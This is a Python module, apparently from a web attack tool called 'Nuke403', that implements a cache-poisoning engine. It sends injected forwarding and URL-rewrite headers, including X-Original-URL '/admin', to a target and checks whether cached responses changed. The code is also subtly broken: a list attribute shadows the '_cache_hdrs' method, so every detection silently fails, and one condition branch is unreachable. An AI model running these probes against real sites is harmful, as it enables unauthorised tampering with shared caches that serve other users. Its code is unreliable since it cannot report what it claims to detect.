import asyncio
import hashlib
import logging
import re
from typing import List, Dict, Any, Optional, Mapping, Tuple
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl

logger = logging.getLogger(__name__)

class CachePoisoningEngine:
    def __init__(self, *, max_concurrency: int = 6):
        self.max_concurrency = max_concurrency
        self.candidate_headers = [
            "X-Forwarded-Host",
            "X-Forwarded-Proto",
            "X-Forwarded-Scheme",
            "X-Forwarded-Port",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Host",
            "Forwarded",  
        ]

        self._safe_hosts = [
            "nuke403.invalid",
            "nuke403.example",
            "cachepoison.invalid",
            "cdn-origin.example",
        ]

        self._cache_hdrs = [
            "x-cache",
            "x-cache-hits",
            "age",
            "via",
            "cf-cache-status",
            "server-timing",
        ]

    async def generate_payloads(self, target_url: str, base_headers: Optional[Dict[str, str]] = None, http_client: Any = None) -> List[Dict[str, Any]]:
        parsed = urlparse(target_url)
        path = parsed.path or "/"

        base_headers = dict(base_headers or {})
        if "Accept" not in base_headers:
            base_headers["Accept"] = "*/*"
        if "User-Agent" not in base_headers:
            base_headers["User-Agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            )

        payloads: List[Dict[str, Any]] = []

        def add(label: str, headers: Dict[str, str]):
            payloads.append({
                "label": label,
                "headers": headers,
            })

        for h in self._safe_hosts:
            add("X-Forwarded-Host", {"X-Forwarded-Host": h})
            add("X-Host", {"X-Host": h})
            add("Forwarded-host", {"Forwarded": f'host="{h}"'})

        add("X-Forwarded-Proto-http", {"X-Forwarded-Proto": "http"})
        add("X-Forwarded-Proto-https", {"X-Forwarded-Proto": "https"})
        add("X-Forwarded-Scheme-http", {"X-Forwarded-Scheme": "http"})
        add("X-Forwarded-Scheme-https", {"X-Forwarded-Scheme": "https"})
        add("Forwarded-proto-http", {"Forwarded": 'proto="http"'})
        add("Forwarded-proto-https", {"Forwarded": 'proto="https"'})
        add("X-Forwarded-Port-8080", {"X-Forwarded-Port": "8080"})
        add("X-Forwarded-Port-443", {"X-Forwarded-Port": "443"})
        add("X-Original-URL-admin", {"X-Original-URL": "/admin"})
        add("X-Rewrite-URL-admin", {"X-Rewrite-URL": "/admin"})
        add("X-Original-URL-root", {"X-Original-URL": "/"})
        add("X-Rewrite-URL-root", {"X-Rewrite-URL": "/"})
        prepared: List[Dict[str, Any]] = []
        for p in payloads:
            salt = "cp" + hashlib.sha1(p["label"].encode("utf-8")).hexdigest()[:6]
            prepared.append({
                "label": p["label"],
                "headers": {**base_headers, **p["headers"]},
                "query_salt": salt,
            })

        logger.info(f"[CachePoison] Prepared {len(prepared)} payloads")
        return prepared

    async def test_payloads(self, target_url: str, payloads: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        results: List[Dict[str, Any]] = []
        sem = asyncio.Semaphore(self.max_concurrency)

        async def run_one(payload: Dict[str, Any]) -> Optional[Dict[str, Any]]:
            label = payload["label"]
            poison_headers = payload["headers"]
            salt = payload["query_salt"]

            poison_url = self._with_probe_query(target_url, salt)
            victim_url = poison_url 

            try:
                async with sem:
                    p_resp = await self._get_snapshot(http_client, poison_url, headers=poison_headers)
                    minimal_headers = {
                        "Accept": "*/*",
                        "User-Agent": "Mozilla/5.0 (compatible; Nuke403/1.0; +https://example.invalid/)",
                    }
                    v_resp = await self._get_snapshot(http_client, victim_url, headers=minimal_headers)

                if not p_resp or not v_resp:
                    return None

                verdict, reason = self._is_cache_poisoned(p_resp, v_resp, label)

                if verdict:
                    return {
                        "technique": "cache_poisoning",
                        "label": label,
                        "poison_url": poison_url,
                        "victim_url": victim_url,
                        "initial_status": p_resp["status"],
                        "cached_status": v_resp["status"],
                        "proof": {
                            "cache_headers_poison": {k: p_resp["headers"].get(k) for k in self._cache_hdrs() if p_resp["headers"].get(k)},
                            "cache_headers_victim": {k: v_resp["headers"].get(k) for k in self._cache_hdrs() if v_resp["headers"].get(k)},
                            "vary": v_resp["headers"].get("vary", ""),
                            "location_poison": p_resp["headers"].get("location", ""),
                            "location_victim": v_resp["headers"].get("location", ""),
                            "body_md5_poison": p_resp["body_md5"],
                            "body_md5_victim": v_resp["body_md5"],
                            "reason": reason,
                        },
                    }
            except Exception as e:
                logger.debug(f"[CachePoison] {label} failed: {e}")
                return None

            return None

        tasks = [asyncio.create_task(run_one(p)) for p in payloads]
        for r in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(r, Exception):
                logger.debug(f"[CachePoison] task error: {r}")
                continue
            if r:
                results.append(r)

        return results

    def _is_cache_poisoned(self, poison: Dict[str, Any], victim: Dict[str, Any], label: str) -> Tuple[bool, str]:
        ph = poison["headers"]
        vh = victim["headers"]

        p_cache = self._extract_cache_meta(ph)
        v_cache = self._extract_cache_meta(vh)
        lowered = label.lower()
        mutated_key = None
        injected_host = None
        if "forwarded-host" in lowered or lowered.startswith("x-host"):
            mutated_key = "x-forwarded-host" if "forwarded-host" in lowered else "x-host"
            m = re.search(r'([a-z0-9\-]+\.(?:invalid|example))', label, re.I)
            injected_host = m.group(1) if m else None
        elif "forwarded-host" in lowered or lowered.startswith("forwarded-host"):
            mutated_key = "forwarded"
        elif "proto" in lowered or "scheme" in lowered:
            mutated_key = "x-forwarded-proto" if "proto" in lowered else "x-forwarded-scheme"
        elif "port" in lowered:
            mutated_key = "x-forwarded-port"
        elif "original-url" in lowered:
            mutated_key = "x-original-url"
        elif "rewrite-url" in lowered:
            mutated_key = "x-rewrite-url"
        elif "forwarded-proto" in lowered:
            mutated_key = "forwarded"

        if poison["status"] != victim["status"]:
            if v_cache["is_hit"] or v_cache["age"] > 0:
                return True, "status_changed_and_victim_cache_hit"
        loc_v = vh.get("location", "") or ""
        if injected_host and injected_host.lower() in loc_v.lower():
            return True, "victim_location_contains_injected_host"

        if poison["body_md5"] != victim["body_md5"]:
            if v_cache["is_hit"] or v_cache["age"] > 0:
                return True, "body_diff_and_victim_cache_hit"
            vary = (vh.get("vary") or "").lower()
            if mutated_key and mutated_key not in vary:
                return True, "body_diff_and_vary_missing_mutated_header"

        if (p_cache["is_miss"] and v_cache["is_hit"]) or (p_cache["age"] == 0 and v_cache["age"] > 0):
            if (poison["status"] != victim["status"]) or (poison["body_md5"] != victim["body_md5"]) or (loc_v != ph.get("location", "")):
                return True, "cache_progression_miss_to_hit_with_change"

        return False, ""

    def _extract_cache_meta(self, headers: Mapping[str, str]) -> Dict[str, Any]:
        def get(key: str) -> str:
            return headers.get(key, "") or ""

        xcache = get("x-cache").lower()
        cf = get("cf-cache-status").lower()
        age = 0
        try:
            age = int(get("age"))
        except Exception:
            age = 0

        is_hit = any(k in (xcache or "") for k in ("hit", "refresh-hit")) or (cf in ("hit", "dynamic", "revalidated"))
        is_miss = "miss" in (xcache or "") or (cf == "miss")

        return {"is_hit": is_hit, "is_miss": is_miss, "age": age}

    def _cache_hdrs(self) -> List[str]:
        return ["x-cache", "x-cache-hits", "age", "via", "cf-cache-status", "server-timing", "vary", "location"]

    async def _get_snapshot(self, http_client, url: str, headers: Optional[Dict[str, str]] = None) -> Optional[Dict[str, Any]]:
        try:
            resp = await self._safe_get(http_client, url, headers=headers or {}, timeout=12)
            if not resp:
                return None
            status, hdrs, body = await self._normalize_response(resp)
            h = {str(k).lower(): str(v) for k, v in dict(hdrs or {}).items()}
            body_s = body if isinstance(body, str) else ""
            return {
                "status": int(status),
                "headers": h,
                "body": body_s,
                "body_md5": hashlib.md5(body_s.encode("utf-8", errors="ignore")).hexdigest(),
            }
        except Exception as e:
            logger.debug(f"[CachePoison] snapshot failed for {url}: {e}")
            return None

    async def _safe_get(self, http_client, url: str, headers: Dict[str, str], timeout: int = 12):
        try:
            return await http_client.get(url, headers=headers, timeout=timeout, follow_redirects=True)
        except TypeError:
            try:
                return await http_client.get(url, headers=headers, timeout=timeout)
            except Exception as e:
                logger.debug(f"_safe_get failed for {url}: {e}")
                return None
        except Exception as e:
            logger.debug(f"_safe_get failed for {url}: {e}")
            return None

    async def _normalize_response(self, resp) -> Tuple[int, Mapping[str, str], str]:
        status = getattr(resp, "status_code", None)
        if status is None:
            status = getattr(resp, "status", None)
        if status is None:
            status = 0

        headers = getattr(resp, "headers", {}) or {}
        text_val = getattr(resp, "text", None)
        if isinstance(text_val, str):
            body = text_val
        else:
            body = ""
            try:
                if callable(text_val):
                    maybe = text_val()
                    if asyncio.iscoroutine(maybe):
                        body = await maybe
                    else:
                        body = str(maybe) if maybe is not None else ""
            except Exception:
                body = ""
        return int(status), headers, body

    def _with_probe_query(self, url: str, salt: str) -> str:
        parsed = urlparse(url)
        q = dict(parse_qsl(parsed.query, keep_blank_values=True))
        q["__n403cp"] = salt
        new_query = urlencode(q)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, new_query, parsed.fragment))
